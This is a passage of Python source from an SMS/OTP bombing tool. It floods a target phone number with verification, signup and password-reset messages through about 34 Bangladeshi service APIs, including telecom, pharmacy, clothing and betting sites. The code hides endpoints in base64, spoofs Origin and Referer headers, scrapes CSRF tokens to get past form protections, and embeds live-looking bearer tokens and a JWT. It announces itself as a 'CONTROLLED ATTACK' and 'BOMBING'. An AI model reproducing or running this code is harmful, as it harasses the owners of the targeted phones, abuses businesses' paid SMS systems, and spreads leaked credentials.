            phone = self.phone_data['with_0']
            payload = {"mobile_no": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Ghoori Learning", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Ghoori Learning", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Deepto Play Service
    async def _s18(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZGVlcHRvcGxheS5jb20vdjIvYXV0aC9sb2dpbj9jb3VudHJ5PUJEJnBsYXRmb3JtPXdlYiZsYW5ndWFnZT1lbg==').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuZGVlcHRvcGxheS5jb20=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuZGVlcHRvcGxheS5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Deepto Play - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus880']
            payload = {"number": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Deepto Play", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Deepto Play", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # ePharma Service (with CSRF)
    async def _s19(self, session):
        # First get CSRF token
        csrf_url = base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZC8=').decode()
        try:
            async with session.get(csrf_url, ssl=_ssl, timeout=15) as resp:
                text = await resp.text()
                # Extract CSRF token from meta tag
                import re
                csrf_match = re.search(r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']', text)
                csrf_token = csrf_match.group(1) if csrf_match else "default_token"
        except:
            csrf_token = "default_token"
        
        url = base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZC9hdXRoZW50aWNhdGlvbi9zZW5kLW90cA==').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZA==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZC8=').decode(),
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting ePharma - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            data = {"number": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("ePharma", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("ePharma", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Sailor Clothing Service (Multiple endpoints)
    async def _s20(self, session):
        signup_url = base64.b64decode(b'aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9zaWdudXA=').decode()
        resend_url = base64.b64decode(b'aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9yZXNlbmRfY29kZQ==').decode()
        forget_url = base64.b64decode(b'aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9wYXNzd29yZC9mb3JnZXRfcmVxdWVzdA==').decode()
        
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "authorization": "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr",
            "origin": base64.b64decode(b'aHR0cHM6Ly9zYWlsb3IuY2xvdGhpbmc=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9zYWlsb3IuY2xvdGhpbmcv').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Sailor Clothing - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            
            # Try forget password method
            forget_data = {"email_or_phone": phone, "send_code_by": "phone"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(forget_url, headers=h, json=forget_data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Sailor Clothing", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Sailor Clothing", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Isho Service (with CSRF)
    async def _s21(self, session):
        register_url = base64.b64decode(b'aHR0cHM6Ly93d3cuaXNoby5jb20vcmVnaXN0ZXI=').decode()
        otp_url = base64.b64decode(b'aHR0cHM6Ly93d3cuaXNoby5jb20vcmVnaXN0ZXJfb3Rw').decode()
        
        # Get CSRF token
        try:
            async with session.get(register_url, ssl=_ssl, timeout=15) as resp:
                text = await resp.text()
                import re
                token_match = re.search(r'<input[^>]*name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', text)
                csrf_token = token_match.group(1) if token_match else "default_token"
        except:
            csrf_token = "default_token"
        
        h = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuaXNoby5jb20=').decode(),
            "referer": register_url,
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Isho - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            import random, string
            email = f"{''.join(random.choices(string.ascii_lowercase, k=6))}@gmail.com"
            
            data = {"_token": csrf_token, "phone": phone, "email": email}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(otp_url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Isho", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Isho", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # MedEasy Service
    async def _s22(self, session):
        url = f"https://api.medeasy.health/api/send-otp/{self.phone_data['with_plus88']}/"
        h = {
            "accept": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9tZWRlYXN5LmhlYWx0aA==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9tZWRlYXN5LmhlYWx0aC8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting MedEasy - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.get(url, headers=h, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("MedEasy", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("MedEasy", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Osudpotro Service
    async def _s23(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkub3N1ZHBvdHJvLmNvbS9hcGkvdjEvdXNlcnMvc2VuZF9vdHA=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "authorization": "Bearer undefined",
            "origin": base64.b64decode(b'aHR0cHM6Ly9vc3VkcG90cm8uY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9vc3VkcG90cm8uY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Osudpotro - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = f"+88-{self.phone_data['cleaned']}"
            payload = {"mobile": phone, "deviceToken": "web", "language": "en", "os": "web"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Osudpotro", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Osudpotro", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # TheClinicall Service
    async def _s24(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly90aGVjbGluaWNhbGwuY29tL2JrYXBpL2F1dGgvdXNlci9vdHAvc2lnbmlu').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "authorization": "Bearer Hello",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cudGhlY2xpbmljYWxsLmNvbQ==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cudGhlY2xpbmljYWxsLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting TheClinicall - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['cleaned']
            payload = {"countryCode": "BD", "dialCode": "880", "phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("TheClinicall", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("TheClinicall", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Shombhob Service (with XSRF)
    async def _s25(self, session):
        login_url = base64.b64decode(b'aHR0cHM6Ly9zaG9tYmhvYi5jb20vdXNlcmxvZ2lu').decode()
        otp_url = base64.b64decode(b'aHR0cHM6Ly9zaG9tYmhvYi5jb20vYXBpL290cC1sb2dpbg==').decode()
        
        # Get XSRF token
        try:
            async with session.get(login_url, ssl=_ssl, timeout=15) as resp:
                text = await resp.text()
                import re
                xsrf_match = re.search(r'XSRF[_-]?TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']', text)
                xsrf_token = xsrf_match.group(1) if xsrf_match else "default_token"
        except:
            xsrf_token = "default_token"
        
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9zaG9tYmhvYi5jb20=').decode(),
            "referer": login_url,
            "x-xsrf-token": xsrf_token,
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Shombhob - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(otp_url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Shombhob", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Shombhob", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Care Box Service
    async def _s26(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93d3cuYXBpLWNhcmUtYm94LmNsaWNrL2FwaS91c2VyL3JlZ2lzdGVyLz92ZXJzaW9uPW90cA==').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuY2FyZS1ib3guY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuY2FyZS1ib3guY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Care Box - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus880']
            import random
            names = ["Rakib Khan", "Md Hossain", "Sajib Ahmed", "Arif Hasan"]
            name = random.choice(names)
            payload = {"Name": name, "Phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Care Box", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Care Box", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Renix Care Service
    async def _s27(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9yZW5peGFwaS5yZW5peGNhcmUuY29tL3Ntcy1hcGkvc2VuZC1vdHA=').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9yZW5peGNhcmUuY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9yZW5peGNhcmUuY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Renix Care - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Renix Care", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Renix Care", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Jayabaji Services (4 APIs)
    async def _s28(self, session):
        # Check Username API
        url = base64.b64decode(b'aHR0cHM6Ly93d3cuamF5YWJhamkzLmNvbS9hcGkvcmVnaXN0ZXIvY2hlY2stdXNlcm5hbWU=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "device": "desktop",
            "domain": "www.jayabaji3.com",
            "lang": "bn-bd",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuamF5YWJhamkzLmNvbQ==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuamF5YWJhamkzLmNvbS9ibi1iZD9zaWdudXA9MQ==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Jayabaji Check Username - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['cleaned']
            import random, string
            username = f"sojib{''.join(random.choices(string.digits, k=5))}"
            payload = {"username": username, "email": "", "mobileno": phone, "language": "bn", "langCountry": "bn-bd"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Jayabaji Check", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Jayabaji Check", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # PKLuck2 Services (2 APIs)
    async def _s29(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20vd3BzL3ZlcmlmaWNhdGlvbi9zbXMvcmVnaXN0ZXI=').decode()
        h = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Device': 'web',
            'Language': 'BN',
            'Merchant': 'pklubdtf4',
            'Origin': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20=').decode(),
            'Referer': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20v').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}🔄 Starting PKLuck2 Register - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"countryDialingCode": "880", "mobileNo": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("PKLuck2 Register", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("PKLuck2 Register", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # PKLuck2 No Login
    async def _s30(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20vd3BzL3ZlcmlmaWNhdGlvbi9zbXMvbm9Mb2dpbg==').decode()
        h = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Device': 'web',
            'Language': 'BN',
            'Merchant': 'pklubdtf4',
            'Origin': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20=').decode(),
            'Referer': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20v').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}🔄 Starting PKLuck2 No Login - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"mobileNum": phone, "countryDialingCode": "880"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("PKLuck2 No Login", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("PKLuck2 No Login", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # More Grameenphone Services
    async def _s31(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9ncHdlYm1zLmdyYW1lZW5waG9uZS5jb20vYXBpL3YxL2ZsZXhpcGxhbi1wdXJjaGFzZS9hY3RpdmF0aW9u').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Authorization": "Bearer null",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbQ==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting GP Flexiplan - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"payment_mode": "mobile_balance", "longevity": 1, "voice": 100, "data": 0, "fourg": 0, "bioscope": 0, "sms": 0, "mca": 0, "price": 69, "msisdn": phone, "bundle_id": 60817, "is_login": False}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("GP Flexiplan", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("GP Flexiplan", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # GP FWA Service
    async def _s32(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9ncGZpLWFwaS5ncmFtZWVucGhvbmUuY29tL2FwaS92MS9md2EvcmVxdWVzdC1mb3Itb3Rw').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9ncGZpLmdyYW1lZW5waG9uZS5jb20=').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9ncGZpLmdyYW1lZW5waG9uZS5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting GP FWA - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone, "email": "", "language": "en"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("GP FWA", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("GP FWA", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Mevrik Service
    async def _s33(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9jaGFubmVscy5tZXZyaWsuY29tOjQyMDIvYXBpL3YxL2NsYWltLXNlc3Npb24=').decode()
        h = {
            "Accept": "application/json",
            "Content-Type": "text/plain",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9jaGF0Lm1ldnJpay5jb206NDIxMw==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9jaGF0Lm1ldnJpay5jb206NDIxMy8=').decode(),
            "x-mevrik-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMSwiaHR0cHM6XC9cL21ldnJpay5jb21cL2p3dFwvY2xhaW1zIjp7IngtbWV2cmlrLWFsbG93ZWQtcm9sZXMiOlsidXNlciJdfX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Mevrik - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            import random
            names = ["MD Hossain", "Ali Khan", "Rahim Ahmed", "Rakib Hasan"]
            name = random.choice(names)
            payload = {"data": {"user_ref": phone, "name": name}}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Mevrik", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Mevrik", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Priyoshikkhaloy Service
    async def _s34(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcHAucHJpeW9zaGlra2hhbG95LmNvbS9hcGkvdXNlci9yZWdpc3Rlci1sb2dpbi5waHA=').decode()
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        print(f"{_c['y']}🔄 Starting Priyoshikkhaloy - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {"mobile": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Priyoshikkhaloy", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Priyoshikkhaloy", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _run_all_services_slowly(self):
        print(f"\n{_c['r']}🚀 LAUNCHING SLOW CONTROLLED ATTACK{_c['e']}")
        print(f"{_c['y']}⚡ ALL 34+ APIs SENDING 5 REQUESTS EACH ONE BY ONE!{_c['e']}")
        print(f"{_c['p']}💥 SLOW SPEED × CONTROLLED POWER × SEQUENTIAL BOMBING{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")
        
        # Simple single session
        timeout = aiohttp.ClientTimeout(total=20, connect=10)
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache"
            }
        ) as session:
            
            print(f"{_c['c']}[SLOW MODE] Running 34+ services sequentially (each sends 5 requests)...{_c['e']}")
            
            # Run services one after another (not simultaneously)
            start_time = time.time()
            
            # BTCL Services (3 APIs)
            await self._s1(session)
            print(f"{_c['g']}✅ BTCL MyBTCL completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s2(session)
            print(f"{_c['g']}✅ BTCL PhoneBill completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s4(session)
            print(f"{_c['g']}✅ BTCL BDIA completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Entertainment Services (3 APIs)
            await self._s3(session)
            print(f"{_c['g']}✅ Bioscope Plus completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s17(session)
            print(f"{_c['g']}✅ Ghoori Learning completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s18(session)
            print(f"{_c['g']}✅ Deepto Play completed{_c['e']}")
            await asyncio.sleep(1)
            
            # E-commerce Services (4 APIs)
            await self._s5(session)
            print(f"{_c['g']}✅ BD Tickets completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s6(session)
            print(f"{_c['g']}✅ Apex4U completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s7(session)
            print(f"{_c['g']}✅ Swap.com.bd completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s14(session)
            print(f"{_c['g']}✅ Bikroy completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Global Services (1 API)
            await self._s8(session)
            print(f"{_c['g']}✅ Ilyn Global completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Healthcare Services (7 APIs)
            await self._s9(session)
            print(f"{_c['g']}✅ Arogga completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s19(session)
            print(f"{_c['g']}✅ ePharma completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s22(session)
            print(f"{_c['g']}✅ MedEasy completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s24(session)
            print(f"{_c['g']}✅ TheClinicall completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s26(session)
            print(f"{_c['g']}✅ Care Box completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s27(session)
            print(f"{_c['g']}✅ Renix Care completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Fashion & Clothing (2 APIs)
            await self._s20(session)
            print(f"{_c['g']}✅ Sailor Clothing completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s21(session)
            print(f"{_c['g']}✅ Isho completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Financial Services (1 API)
            await self._s10(session)
            print(f"{_c['g']}✅ Fundesh completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Marketplace Services (3 APIs)
            await self._s11(session)
            print(f"{_c['g']}✅ Garibook completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s12(session)
            print(f"{_c['g']}✅ Sheba completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s25(session)
            print(f"{_c['g']}✅ Shombhob completed{_c['e']}")
            await asyncio.sleep(1)
            
            # App Services (1 API)
            await self._s13(session)
            print(f"{_c['g']}✅ AppLink completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Grameenphone Services (5 APIs)
            await self._s15(session)
            print(f"{_c['g']}✅ MyGP Cinematic completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s16(session)
            print(f"{_c['g']}✅ GP Web Login completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s31(session)
            print(f"{_c['g']}✅ GP Flexiplan completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s32(session)
            print(f"{_c['g']}✅ GP FWA completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s33(session)
            print(f"{_c['g']}✅ Mevrik completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Gaming/Betting Services (3 APIs)
            await self._s28(session)
            print(f"{_c['g']}✅ Jayabaji Check completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s29(session)
